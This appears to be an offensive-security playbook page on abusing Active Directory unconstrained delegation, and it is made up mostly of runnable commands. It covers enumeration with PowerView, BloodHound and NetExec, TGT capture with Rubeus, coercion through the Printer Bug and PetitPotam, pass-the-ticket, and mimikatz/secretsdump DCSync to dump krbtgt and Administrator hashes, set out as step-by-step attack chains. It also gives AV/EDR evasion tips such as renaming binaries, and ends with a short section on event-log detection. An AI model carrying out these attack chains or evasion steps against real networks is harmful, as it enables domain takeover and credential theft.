# Unconstrained Delegation Abuse

## Overview

Unconstrained delegation (flag `TRUSTED_FOR_DELEGATION`) allows a computer or service to impersonate authenticated users to **any** other service in the domain. When a user authenticates to a server with unconstrained delegation, the server receives the user's TGT (Ticket-Granting Ticket) and can use it to impersonate that user anywhere.

This is the most dangerous delegation type. If you compromise a server with unconstrained delegation, you can capture TGTs from any user who connects to it.

## Finding Unconstrained Delegation

### PowerView

```powershell
# Find computers with unconstrained delegation
Get-DomainComputer -Unconstrained

# Or with LDAP filter
Get-DomainComputer -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"

# Find users with unconstrained delegation
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"

# All objects with unconstrained delegation
Get-DomainObject -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"

# Resolve DNS names
Get-DomainComputer -Unconstrained -Properties dnshostname
```

### BloodHound

```cypher
// All unconstrained delegation computers
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

// Unconstrained delegation computers with DA sessions
MATCH (c:Computer {unconstraineddelegation:true})
MATCH (u:User)-[:HasSession]->(c)
MATCH (u)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
RETURN c.name AS Computer, u.name AS DA_User

// Show path from unconstrained server to DA
MATCH (c:Computer {unconstraineddelegation:true})
MATCH (u:User {domain:"DOMAIN.LOCAL"})-[:HasSession]->(c)
MATCH (u)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
MATCH p = (u)-[*1..]->(g)
RETURN c.name, u.name, p
```

### NetExec

```bash
# Find unconstrained delegation
nxc ldap dc01.domain.local -u user -p pass --trusted-for-delegation

# With module
nxc ldap dc01.domain.local -u user -p pass -M delegation
```

### Manual / AD Module

```powershell
# AD Module
Get-ADComputer -Filter {TrustedForDelegation -eq $true}

# ADSI
$adsisearcher = New-Object DirectoryServices.DirectorySearcher
$adsisearcher.Filter = "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
$adsisearcher.FindAll()
```

## Exploitation: TGT Capture via Printer Bug (SpoolSample)

### Prerequisites
- Admin (or equivalent) access to a server with **unconstrained delegation**
- The target server must have the **Print Spooler service** running (usually `spoolsv.exe`)
- Network connectivity from the unconstrained server to the target server (target's Spooler must be reachable)

### Step 1: Set Up Rubeus to Monitor for Incoming Tickets

```powershell
# On the unconstrained delegation server (as admin)
# Monitor for incoming TGTs
Rubeus.exe monitor /interval:5 /nowrap

# Or harvest all ticket data
Rubeus.exe monitor /interval:1 /nowrap /targetuser:Administrator

# Monitor for specific user
Rubeus.exe monitor /interval:5 /filteruser:Administrator /nowrap
```

### Step 2: Trigger the Printer Bug (SpoolSample)

```bash
# From Kali / Linux (impacket printerbug.py)
python3 printerbug.py domain/user:pass@target_dc.domain.local attacker_server.domain.local

# From Python
python3 printerbug.py domain/user:pass@target_machine.domain.local unconstrained_server.domain.local

# From Windows (SpoolSample.exe)
SpoolSample.exe target_dc.domain.local unconstrained_server.domain.local

# From Windows (MS-RPRN abuse via Dementor)
MS-RPRN.exe \\target_dc \\unconstrained_server

# Target common high-value systems (Domain Controllers, Exchange, etc.)
python3 printerbug.py domain/user:pass@DC01.domain.local WS01.domain.local
```

### Step 3: Capture the TGT

When the Printer Bug triggers the target to connect back to your unconstrained server, Rubeus captures the TGT of the target machine account:

```
[*] Action: TGT Monitor
[*] 5 second interval
[*] Using domain: DOMAIN.LOCAL (S-1-5-21-xxxx)
[*]  Target user: DC01$

[*] 7/8/2026 10:00:00 AM - ******** TGT ********
[*] base64 TGT data:
doIFxDCCB...
```

### Step 4: Use the Captured TGT

```powershell
# Pass the ticket (PTT)
Rubeus.exe ptt /ticket:doIFxDCCB...

# Verify
klist

# DCSync with captured DC TGT
Rubeus.exe asktgs /ticket:doIFxDCCB... /service:LDAP/DC01.domain.local /ptt
python3 secretsdump.py -k DC01.domain.local

# Dump hashes
mimikatz.exe "lsadump::dcsync /domain:domain.local /user:Administrator" exit
```

### Full Attack Chain Script (Windows)

```powershell
# 1. On unconstrained server (as admin)
Start-Job { Rubeus.exe monitor /interval:2 /nowrap }

# 2. Trigger SpoolSample
SpoolSample.exe DC01.domain.local WS01.domain.local

# 3. Wait for TGT to appear in monitor output
# 4. Extract base64 ticket
# 5. Pass the ticket
Rubeus.exe ptt /ticket:<base64_ticket>

# 6. Dump DC credentials
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /user:krbtgt" exit
```

### Full Attack Chain (Linux)

```bash
# 1. Ensure unconstrained server is accessible
# 2. Start listener for TGT (use Rubeus via SOCKS/proxy if needed)

# 3. Trigger printer bug
python3 printerbug.py 'domain/user:pass'@DC01.domain.local WS01.domain.local

# 4. On WS01 (unconstrained), capture TGT with Rubeus
# 5. Dump DCSync via captured ticket
# You may need to proxy Rubeus output or use Rubeus through C2

# Alternative: use krbrelayx to read TGT if you can capture the traffic
python3 krbrelayx.py -ticket captured_tgt.kirbi
```

## Alternative Trigger Methods

### SpoolSample (MS-RPRN)

```cmd
# SpoolSample.exe (Windows)
SpoolSample.exe <target> <capture_server>

SpoolSample.exe DC01.domain.local WS01.domain.local
SpoolSample.exe DC01 DC01  # Capture DC's own ticket (somewhat noisier)
```

### PetitPotam (MS-EFSRPC)

```bash
# PetitPotam can also trigger authentication
python3 petitpotam.py -d domain.local -u user -p pass attacker_server target_dc
```

### Coerce Authentication General

```bash
# Various MS protocols can trigger outbound auth:
# - MS-RPRN (Print Spooler)
# - MS-EFSRPC (Encrypting File System Remote Protocol)
# - MS-FSRVP (File Share Shadow Copy)
# - MS-W32TIME (Windows Time Service)

# Refer to 04_Lateral_Movement for coercion techniques
```

## Other Methods to Get TGTs on Unconstrained Servers

### Wait for Admin Sessions

```powershell
# If a Domain Admin already has a session on the unconstrained server
# Rubeus monitor will capture TGT when DA connects

# Check for admin sessions
Find-LocalAdminAccess
Invoke-UserHunter

# Find DA sessions via BloodHound
MATCH (u:User)-[:HasSession]->(c:Computer {unconstraineddelegation:true})
WHERE (u)-[:MemberOf*1..]->(:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
RETURN u.name, c.name
```

### Force Admin Connection (Net use / PsExec)

```powershell
# If you have control of an account that is local admin on the unconstrained server
# AND that account has DA privileges elsewhere

# Use that account to connect to unconstrained server
net use \\WS01\admin$ /user:DOMAIN\da_account
# Rubeus captures their TGT
```

## Rubeus Full Monitor Options

```powershell
# Basic monitor
Rubeus.exe monitor /interval:5

# Monitor for specific user
Rubeus.exe monitor /interval:5 /filteruser:Administrator

# Monitor with minimal output (base64 ticket only)
Rubeus.exe monitor /interval:1 /nowrap

# Target user (machine account)
Rubeus.exe monitor /interval:5 /targetuser:DC01$

# Output to file (raw ticket data)
Rubeus.exe monitor /interval:5 /nowrap > tickets.log

# Monitor with LDAP session query (find sessions on this server)
Rubeus.exe monitor /interval:5 /ldap
```

## OPSEC Considerations

- **Printer Bug (SpoolSample)** triggers Event ID 4688 (spoolsv.exe → winspool.drv), 5156 (network connection), 7036 (Print Spooler service notification)
- **Rubeus monitor** is a local process on the compromised server; does not generate network traffic but creates Event ID 4688 for Rubeus.exe
- **SpoolSample execution** creates network connections from target to capture server — can be detected as anomalous RPC traffic
- **Captured TGT** is time-limited (typically 10 hours for user tickets, longer for machine tickets)
- **PetitPotam** may be detected if MS-EFSRPC callbacks are monitored
- **AV/EDR**: Rubeus and SpoolSample are commonly signatured — rename binaries or use in-memory execution
- **Firewall**: Print Spooler RPC (TCP 135, 445, dynamic RPC ports) must be open between target and capture server

## Detection

| Event ID | Source | Description |
|----------|--------|-------------|
| 4688 | Security | SpoolSample.exe, Rubeus.exe, printerbug.py execution |
| 5156 | Security | WFP connection from target to capture server |
| 4768 | Security | Kerberos TGT request (if monitoring KDC) |
| 4769 | Security | Kerberos TGS request (delegation usage) |
| 7036 | System | Print Spooler service events |
| Sysmon EID 3 | Sysmon | Network connection (spoolsv.exe → capture server) |
| Sysmon EID 1 | Sysmon | Rubeus/SpoolSample process creation |

### Blue Team Detection

```powershell
# Detect Rubeus execution
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4688} | Where-Object { $_.Properties[5].Value -like "*Rubeus*" }

# Detect SpoolSample
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4688} | Where-Object { $_.Properties[5].Value -like "*SpoolSample*" }

# Monitor for abnormal spoolsv.exe network connections (Sysmon EID 3)
# Normally spoolsv.exe shouldn't make many outbound connections
```

## Quick Reference

```powershell
# Find unconstrained delegation
Get-DomainComputer -Unconstrained

# Start Rubeus monitor on captive server
Rubeus.exe monitor /interval:5 /nowrap

# Trigger Printer Bug (impacket)
python3 printerbug.py domain/user:pass@DC01.domain.local WS01.domain.local

# Alternative SpoolSample (Windows)
SpoolSample.exe DC01 WS01

# Use captured TGT (PTT)
Rubeus.exe ptt /ticket:<base64>

# DCSync with captured ticket
mimikatz.exe "lsadump::dcsync /domain:domain.local /user:Administrator" exit

# BloodHound find unconstrained with DA sessions
MATCH (c:Computer {unconstraineddelegation:true})
MATCH (u:User)-[:HasSession]->(c)
MATCH (u)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
RETURN c.name, u.name
```
